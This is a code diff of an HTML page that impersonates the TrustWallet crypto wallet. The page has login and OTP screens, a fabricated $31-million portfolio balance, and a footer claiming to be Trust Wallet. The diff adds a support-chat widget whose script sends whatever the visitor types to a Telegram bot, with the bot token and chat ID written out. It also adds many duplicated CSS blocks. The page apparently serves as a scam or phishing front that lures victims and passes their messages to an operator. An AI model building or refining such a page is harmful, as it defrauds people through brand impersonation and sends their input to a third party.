@@ -101,13 +101,14 @@
         }
 
         .navbar {
-            background: rgba(0, 0, 0, 0.9);
-            padding: 1rem 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
+  background: rgba(0, 0, 0, 0.9);
+  padding: 1rem 2rem;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  flex-wrap: wrap;
+}
 
         .nav-brand {
             font-size: 1.5rem;
@@ -347,8 +348,14 @@
             }
             
             .navbar {
-                padding: 1rem;
-            }
+  background: rgba(0, 0, 0, 0.9);
+  padding: 1rem 2rem;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  flex-wrap: wrap;
+}
             
             .nav-menu {
                 gap: 1rem;
@@ -422,8 +429,253 @@
     max-width: 90%;
   }
 }
+
+.menu-toggle {
+  background: none;
+  border: none;
+  color: #00d4ff;
+  font-size: 1.5rem;
+  cursor: pointer;
+  margin-left: 1rem;
+}
+
+.sidebar {
+  position: fixed;
+  top: 0;
+  left: -260px;
+  width: 250px;
+  height: 100%;
+  background: #121829;
+  padding: 2rem 1rem;
+  transition: transform 0.3s ease-in-out;
+  transform: translateX(-100%);
+  z-index: 999;
+  box-shadow: 2px 0 5px rgba(0,0,0,0.2);
+}
+.sidebar.show {
+  transform: translateX(0);
+}
+
+.sidebar.show {
+  left: 0;
+}
+.sidebar a, .logout-btn {
+  display: block;
+  margin-bottom: 1rem;
+  color: #cbd5e0;
+  text-decoration: none;
+  padding: 0.5rem 1rem;
+  border-radius: 6px;
+  transition: background 0.3s;
+}
+.sidebar a:hover, .logout-btn:hover {
+  background: rgba(0, 212, 255, 0.2);
+  color: #00d4ff;
+}
+@media (max-width: 768px) {
+  
+.sidebar {
+  position: fixed;
+  top: 0;
+  left: -260px;
+  width: 250px;
+  height: 100%;
+  background: #121829;
+  padding: 2rem 1rem;
+  transition: transform 0.3s ease-in-out;
+  transform: translateX(-100%);
+  z-index: 999;
+  box-shadow: 2px 0 5px rgba(0,0,0,0.2);
+}
+.sidebar.show {
+  transform: translateX(0);
+}
+
+  .user-info {
+    flex-direction: column;
+    align-items: flex-start;
+  }
+}
+
+.menu-toggle {
+  margin-left: 0;
+  margin-right: auto;
+  font-size: 1.75rem;
+  background: none;
+  border: none;
+  color: #00d4ff;
+  cursor: pointer;
+}
+
+.sidebar {
+  position: fixed;
+  top: 0;
+  left: -260px;
+  width: 250px;
+  height: 100%;
+  background: #121829;
+  padding: 2rem 1rem;
+  transition: transform 0.3s ease-in-out;
+  transform: translateX(-100%);
+  z-index: 999;
+  box-shadow: 2px 0 5px rgba(0,0,0,0.2);
+}
+.sidebar.show {
+  transform: translateX(0);
+}
+
+
+html, body {
+  height: 100%;
+  display: flex;
+  flex-direction: column;
+}
+body > .dashboard {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+}
+.main-content {
+  flex: 1;
+}
+footer {
+  margin-top: auto;
+}
+@media (max-width: 768px) {
+  .main-content {
+    grid-template-columns: 1fr !important;
+    padding: 1rem !important;
+  }
+  .nav-brand img {
+    width: 100px !important;
+  }
+  .user-info {
+    flex-direction: column;
+    gap: 0.5rem;
+    align-items: flex-start;
+  }
+  
+.sidebar {
+  position: fixed;
+  top: 0;
+  left: -260px;
+  width: 250px;
+  height: 100%;
+  background: #121829;
+  padding: 2rem 1rem;
+  transition: transform 0.3s ease-in-out;
+  transform: translateX(-100%);
+  z-index: 999;
+  box-shadow: 2px 0 5px rgba(0,0,0,0.2);
+}
+.sidebar.show {
+  transform: translateX(0);
+}
+
+}
+
+
+.sidebar {
+  position: fixed;
+  top: 0;
+  left: -260px;
+  width: 250px;
+  height: 100%;
+  background: #121829;
+  padding: 2rem 1rem;
+  transition: transform 0.3s ease-in-out;
+  transform: translateX(-100%);
+  z-index: 999;
+  box-shadow: 2px 0 5px rgba(0,0,0,0.2);
+}
+.sidebar.show {
+  transform: translateX(0);
+}
+
+.sidebar.show {
+  left: 0;
+}
+.sidebar a, .logout-btn {
+  color: #ffffff;
+  font-size: 0.95rem;
+  margin-bottom: 1rem;
+  text-decoration: none;
+  display: block;
+  padding: 0.6rem 1rem;
+  border-radius: 6px;
+  transition: background 0.3s;
+}
+.sidebar a:hover, .logout-btn:hover {
+  background: rgba(0, 212, 255, 0.15);
+}
+
+@media (max-width: 768px) {
+  .nav-brand {
+    position: absolute;
+    left: 3rem;
+    transition: left 0.3s ease;
+  }
+  .sidebar.show ~ .nav-brand {
+    left: 250px;
+  }
+}
+
+
+.sidebar {
+  position: fixed;
+  top: 0;
+  left: -260px;
+  width: 250px;
+  height: 100%;
+  background: #121829;
+  padding: 2rem 1rem;
+  transition: transform 0.3s ease-in-out;
+  transform: translateX(-100%);
+  z-index: 999;
+  box-shadow: 2px 0 5px rgba(0,0,0,0.2);
+}
+.sidebar.show {
+  transform: translateX(0);
+}
+
+
+@media (max-width: 768px) {
+  .nav-brand {
+    left: 1rem !important;
+    position: relative !important;
+  }
+  .menu-toggle {
+    position: absolute;
+    top: 1rem;
+    right: 1rem;
+  }
+  .navbar {
+  background: rgba(0, 0, 0, 0.9);
+  padding: 1rem 2rem;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  flex-wrap: wrap;
+}
+  .user-info {
+    display: none !important;
+  }
+  .main-content {
+    flex-direction: column;
+    padding: 1rem !important;
+  }
+  .left-panel, .right-panel {
+    width: 100%;
+  }
+}
 </style>
-<script src="https://cdn.jsdelivr.net/npm/chart.js"></script></head>
+
+<script>
+function toggleSidebar() {
+  document.getElementById("sidebar").classList.toggle("show");
+}
+</script><script src="https://cdn.jsdelivr.net/npm/chart.js"></script></head>
 <body>
 <div id="customPopup" style="display:none; position: fixed; top: 20px; right: 20px; background: #1a202c; color: #fff; padding: 1rem 1.5rem; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.4); z-index: 9999; font-size: 0.95rem; max-width: 300px; position: fixed;">
 <span id="popupMessage"></span>
@@ -501,7 +753,7 @@ function showTradeMessage() {
 <img alt="TrustWallet Logo" src="logo.png" style="width: 100px; height: auto;"/>
 </div>
 <h2>Verify OTP</h2>
-<p style="margin-bottom: 20px;">Enter the 6-digit code sent to your phone</p>
+<p style="margin-bottom: 20px;">Enter the 6-digit code sent to your email</p>
 <form id="otpForm">
 <div class="form-group">
 <label for="otpInput">OTP Code</label>
@@ -515,30 +767,25 @@ function showTradeMessage() {
 </button>
 </div>
 </div>
-<div class="dashboard" id="dashboard">
-<nav class="navbar">
-<div class="nav-brand"><img alt="TrustWallet Logo" src="logo.png" style="width: 120px; height: auto;"/></div>
-<ul class="nav-menu">
-<li><a class="active" href="#">Dashboard</a></li>
-<li>
-<a href="#" onclick="showTradeMessage(); return false;" rel="noopener noreferrer" target="_blank">
-                        Trade
-                    </a>
-<li>
+<div class="dashboard" id="dashboard"><nav class="navbar">
+  <div class="nav-brand" id="navLogo">
+    <img alt="TrustWallet Logo" src="logo.png" style="width: 120px; height: auto;"/>
+  </div>
+  <div style="display: flex; gap: 1rem; align-items: center; margin-left: auto;">
+    <span id="welcomeUser" style="color: #cbd5e0;">Welcome, User</span>
+    <button class="menu-toggle" onclick="toggleSidebar()">☰</button>
+  </div>
+</nav><div class="sidebar" id="sidebar">
+    <button id="sidebarClose" onclick="toggleSidebar()">×</button>
+    <div class="sidebar-title" style="font-size: 1.1rem; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 0.5rem; margin-bottom: 1rem;">Explore</div>
+<a href="#" onclick="showTradeMessage(); return false;">Trade</a>
 <a href="#" onclick="showWithdrawMessage(); return false;">Withdraw</a>
-</li>
-<li>
 <a href="#" onclick="showSwapMessage(); return false;">Swap</a>
-</li>
-<li>
 <a href="#" onclick="showTransferMessage(); return false;">Transfer</a>
-</li>
-</li></ul>
-<div class="user-info">
-<span id="welcomeUser">Welcome, User</span>
 <button class="logout-btn" onclick="logout()">Logout</button>
 </div>
-</nav>
+<div class="dashboard-wrapper" style="display: flex; flex-direction: column; min-height: 100%;">
+
 <div class="main-content">
 <div class="left-panel">
 <!-- Balance Card -->
@@ -547,6 +794,7 @@ function showTradeMessage() {
 <div class="balance-title">Total Portfolio Value</div>
 <div style="color: #48bb78;">●</div>
 </div>
+
 <div class="total-balance">$31,432,982.85</div>
 <div class="balance-change">+$2,847.92 (+2.28%) Today</div>
 <div class="assets-grid">
@@ -671,8 +919,16 @@ function showTradeMessage() {
 <canvas id="btcChart"></canvas>
 </div>
 </div></div>
+</div></div><footer>
+<div style="max-width: 1200px; margin: auto; padding: 2rem 1rem; text-align: center;">
+<p style="margin-bottom: 1rem; font-size: 0.9rem;">© 2025 Trust Wallet. All rights reserved.</p>
+<div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 1.5rem; font-size: 0.9rem;">
+<a href="https://trustwallet.com/privacy" style="color: #00d4ff; text-decoration: none;">Privacy Policy</a>
+<a href="https://trustwallet.com/terms" style="color: #00d4ff; text-decoration: none;">Terms of Service</a>
+<a href="https://trustwallet.com/support" style="color: #00d4ff; text-decoration: none;">Support</a>
 </div>
 </div>
+</footer></div>
 <div id="successModal" style="display: none; position: fixed; top: 20px; right: 20px; background: #38a169; color: white; padding: 1rem 1.5rem; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.3); z-index: 9999; font-size: 0.95rem;">
   ✅ Message sent successfully!
 </div>
@@ -809,5 +1065,162 @@ function initCharts() {
         });
     }
 }
-</script></body>
+</script>
+
+<!-- Contact Support Button and Form -->
+<button class="contact-support-btn" onclick="toggleSupportForm()">💬</button>
+<div id="supportFormContainer">
+  <textarea id="supportMessage" placeholder="Type your message..."></textarea>
+  <button onclick="sendSupportMessage()">Send</button>
+</div>
+
+<style>
+.contact-support-btn {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  background: #00d4ff;
+  color: #fff;
+  border: none;
+  border-radius: 50%;
+  width: 56px;
+  height: 56px;
+  font-size: 24px;
+  cursor: pointer;
+  z-index: 10000;
+  box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+}
+#supportFormContainer {
+  position: fixed;
+  bottom: 90px;
+  right: 20px;
+  background: #1a202c;
+  border-radius: 8px;
+  padding: 1rem;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+  display: none;
+  z-index: 10000;
+  width: 300px;
+}
+#supportFormContainer textarea {
+  width: 100%;
+  padding: 0.5rem;
+  border-radius: 6px;
+  border: none;
+  resize: none;
+  height: 80px;
+  margin-bottom: 0.5rem;
+}
+#supportFormContainer button {
+  width: 100%;
+  background: #00d4ff;
+  border: none;
+  color: #fff;
+  padding: 0.5rem;
+  border-radius: 6px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+@media (max-width: 768px) {
+  .nav-brand {
+    position: absolute;
+    left: 3rem;
+    transition: left 0.3s ease;
+  }
+  .sidebar.show ~ .nav-brand {
+    left: 250px;
+  }
+}
+
+
+.sidebar {
+  position: fixed;
+  top: 0;
+  left: -260px;
+  width: 250px;
+  height: 100%;
+  background: #121829;
+  padding: 2rem 1rem;
+  transition: transform 0.3s ease-in-out;
+  transform: translateX(-100%);
+  z-index: 999;
+  box-shadow: 2px 0 5px rgba(0,0,0,0.2);
+}
+.sidebar.show {
+  transform: translateX(0);
+}
+
+
+@media (max-width: 768px) {
+  .nav-brand {
+    left: 1rem !important;
+    position: relative !important;
+  }
+  .menu-toggle {
+    position: absolute;
+    top: 1rem;
+    right: 1rem;
+  }
+  .navbar {
+  background: rgba(0, 0, 0, 0.9);
+  padding: 1rem 2rem;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  flex-wrap: wrap;
+}
+  .user-info {
+    display: none !important;
+  }
+  .main-content {
+    flex-direction: column;
+    padding: 1rem !important;
+  }
+  .left-panel, .right-panel {
+    width: 100%;
+  }
+}
+</style>
+
+
+<script>
+function toggleSupportForm() {
+  const form = document.getElementById("supportFormContainer");
+  form.style.display = form.style.display === "none" ? "block" : "none";
+}
+function sendSupportMessage() {
+  const msg = document.getElementById("supportMessage").value.trim();
+  if (!msg) return alert("Please enter a message");
+  fetch("https://api.telegram.org/bot8124847122:AAFhV7O1JtqexwKdV-EmQfq27uaeW_SNBFE/sendMessage", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: "7154713742",
+      text: `📩 Support Message:\n${msg}`
+    })
+  })
+  .then(() => {
+    alert("Message sent successfully!");
+    document.getElementById("supportMessage").value = "";
+    document.getElementById("supportFormContainer").style.display = "none";
+  })
+  .catch(() => alert("Failed to send message."));
+}
+</script>
+
+<script>
+function logout() {
+  // Hide dashboard and show login form again
+  document.getElementById('dashboard').style.display = 'none';
+  document.getElementById('loginContainer').style.display = 'flex';
+  document.getElementById('otpContainer').style.display = 'none';
+  currentUser = null;
+  generatedOTP = null;
+}
+</script>
+
+</body>
+
 </html>
